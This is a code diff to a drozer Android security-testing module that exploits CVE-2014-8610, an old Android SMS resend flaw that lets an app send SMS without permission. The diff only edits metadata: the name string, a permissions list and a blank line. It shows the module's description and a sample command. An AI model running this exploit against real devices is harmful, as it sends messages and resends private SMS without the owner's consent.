@@ -6,7 +6,7 @@ from pydiesel.reflection.types.reflected_null import ReflectedNull
 
 
 class smsdraftsend(Module):
-	name = "Name: Exploit CVE-2014-8610 Android < 5.0 SMS resend vulnerability (Baidu X-Team)"
+	name = "Exploit CVE-2014-8610 Android < 5.0 SMS resend vulnerability (Baidu X-Team)"
 	description = "Exploit for CVE-2014-8610 that allows for an SMS message send to any recipient without SEND_SMS permission while re-sending all prior SMS messages"
 	examples = """
 dz> run exploit.badauth.smsdraftsend  -m "I <3 Drozer" -t 4015551212
@@ -19,9 +19,9 @@ dz> run exploit.badauth.smsdraftsend  -m "I <3 Drozer" -t 4015551212
 	date = "2014-11-29"
 	license = "BSD (3-clause)"
 	path = ["exploit", "badauth"]
+	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
 
 	RESULT_ERROR_RADIO_OFF=2
-
 
 	def add_arguments(self, parser):
 		parser.add_argument("-m", "--message",  default=None, help="specify the SMS message to send")
